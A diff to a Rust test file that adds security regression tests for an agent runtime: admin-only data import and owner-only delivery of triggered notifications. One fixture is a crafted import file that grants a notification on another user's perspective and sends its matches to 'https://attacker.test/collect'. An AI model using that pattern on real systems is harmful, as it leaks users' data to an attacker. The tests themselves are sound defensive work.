@@ -8,25 +8,30 @@
 //! - Delivery tests call `PerspectiveInstance::calc_notification_trigger_matches`,
 //!   which the notification loop runs to pick the notifications that fire
 //!   and the matches it posts to their webhooks.
+//! - Stream tests build a session's event stream with `build_event_stream`
+//!   and publish triggered notifications to it.
 
 use std::sync::Arc;
 
+use futures::StreamExt;
 use serde_json::{json, Value};
 use uuid::Uuid;
 
 use crate::agent::capabilities::{
-    get_user_default_capabilities, perspective_query_capability, Capability,
+    get_user_default_capabilities, perspective_query_capability, Capability, TokenCheck,
     AGENT_UPDATE_CAPABILITY, ALL_CAPABILITY,
 };
 use crate::agent::AgentService;
+use crate::api::events_ws::build_event_stream;
 use crate::api::ws_handler::{build_handler_map, WsRpcError};
 use crate::db::Ad4mDb;
 use crate::perspectives::perspective_instance::PerspectiveInstance;
 use crate::perspectives::{register_perspective, unregister_perspective};
+use crate::pubsub::{get_global_pubsub, RUNTIME_NOTIFICATION_TRIGGERED_TOPIC};
 use crate::test_utils::setup_wallet;
 use crate::types::{
     ExpressionProof, Link, LinkExpression, LinkStatus, Notification, NotificationInput,
-    PerspectiveHandle, PerspectiveState, RequestContext,
+    PerspectiveHandle, PerspectiveState, RequestContext, TriggeredNotification,
 };
 
 const TRIGGER: &str = "SELECT ?source ?target WHERE { ?source <test://notify> ?target }";
@@ -646,4 +651,135 @@ async fn a_user_session_without_a_did_is_refused() {
         .await
         .expect_err("no DID, no notifications");
     assert_eq!(err.code, 403);
+}
+
+// `runtime.importData` stores a notification's `granted` and `owner_did` as they are in the
+// file. With AGENT_UPDATE alone, Alice could import a granted notification on Bob's
+// perspective and receive Bob's links at her webhook.
+#[tokio::test]
+async fn only_the_admin_credential_imports_data() {
+    setup();
+    user(ALICE);
+    let bob_did = user(BOB);
+    let mut perspectives = Perspectives::default();
+    let bobs = perspectives.add(Some(vec![bob_did.clone()]));
+    let id = Uuid::new_v4().to_string();
+    let dir = tempfile::tempdir().unwrap();
+    let file = dir.path().join("import.json");
+    std::fs::write(
+        &file,
+        json!({
+            "notifications": [{
+                "id": id, "description": "", "app_name": "", "app_url": "", "app_icon_path": "",
+                "trigger": TRIGGER,
+                "perspective_ids": serde_json::to_string(&[&bobs.uuid]).unwrap(),
+                "webhook_url": "https://attacker.test/collect", "webhook_auth": "",
+                "granted": true,
+                "owner_did": bob_did,
+            }],
+        })
+        .to_string(),
+    )
+    .unwrap();
+    let params = json!({ "type": "db", "filePath": file.to_str().unwrap() });
+
+    for (who, ctx) in [
+        ("a managed user", user_ctx(ALICE)),
+        (
+            "an app token with AGENT_UPDATE",
+            app_ctx(vec![AGENT_UPDATE_CAPABILITY.clone()]),
+        ),
+    ] {
+        let err = call("runtime.importData", params.clone(), ctx)
+            .await
+            .expect_err(who);
+        assert_eq!(err.code, 403, "{who}");
+        // Both callers hold AGENT_UPDATE: the admin check refuses them, not the capability check.
+        assert!(err.message.contains("admin credential"), "{who}: {err:?}");
+        assert_eq!(stored(&id), None, "{who} imported a notification");
+    }
+
+    call("runtime.importData", params, admin_ctx())
+        .await
+        .expect("the operator imports");
+    let imported = stored(&id).expect("imported notification");
+    assert!(imported.granted);
+    assert_eq!(imported.owner_did, bob_did);
+}
+
+/// Serialises the event that delivery publishes for a notification of `owner`.
+fn triggered(owner: &str) -> String {
+    serde_json::to_string(&TriggeredNotification {
+        notification: Notification {
+            id: Uuid::new_v4().to_string(),
+            granted: true,
+            description: String::new(),
+            app_name: String::new(),
+            app_url: String::new(),
+            app_icon_path: String::new(),
+            trigger: TRIGGER.to_string(),
+            perspective_ids: vec![],
+            webhook_url: "https://webhook.test".to_string(),
+            webhook_auth: "secret".to_string(),
+            owner_did: owner.to_string(),
+        },
+        perspective_id: "perspective".to_string(),
+        trigger_match: "[]".to_string(),
+    })
+    .unwrap()
+}
+
+async fn next<S: futures::Stream<Item = String> + Unpin>(stream: &mut S) -> Option<String> {
+    tokio::time::timeout(std::time::Duration::from_millis(1500), stream.next())
+        .await
+        .ok()
+        .flatten()
+}
+
+// The owner filter in `build_event_stream` was pinned only as a pure function. Replacing the
+// stream's guard with `true` sent every triggered notification, webhook secret included, to
+// every session, and no test failed.
+#[tokio::test]
+async fn triggered_event_reaches_only_the_owners_stream() {
+    setup();
+    let alice_did = user(ALICE);
+    user(BOB);
+    let check = || TokenCheck::new("", true);
+    let mut alice = build_event_stream(check(), Some(ALICE.to_string()), false).await;
+    let mut bob = build_event_stream(check(), Some(BOB.to_string()), false).await;
+    let mut main = build_event_stream(check(), None, true).await;
+    let pubsub = get_global_pubsub().await;
+
+    pubsub
+        .publish(
+            &RUNTIME_NOTIFICATION_TRIGGERED_TOPIC,
+            &triggered(&alice_did),
+        )
+        .await;
+    let a = next(&mut alice).await;
+    assert!(
+        a.as_deref()
+            .is_some_and(|e| e.contains("notification-triggered")),
+        "owner stream got {a:?}"
+    );
+    assert_eq!(next(&mut bob).await, None, "Bob's stream got Alice's event");
+    assert_eq!(next(&mut main).await, None, "main stream got Alice's event");
+
+    pubsub
+        .publish(
+            &RUNTIME_NOTIFICATION_TRIGGERED_TOPIC,
+            &triggered(&main_agent_did()),
+        )
+        .await;
+    let m = next(&mut main).await;
+    assert!(
+        m.as_deref()
+            .is_some_and(|e| e.contains("notification-triggered")),
+        "main stream got {m:?}"
+    );
+    assert_eq!(
+        next(&mut alice).await,
+        None,
+        "Alice's stream got the main agent's event"
+    );
 }
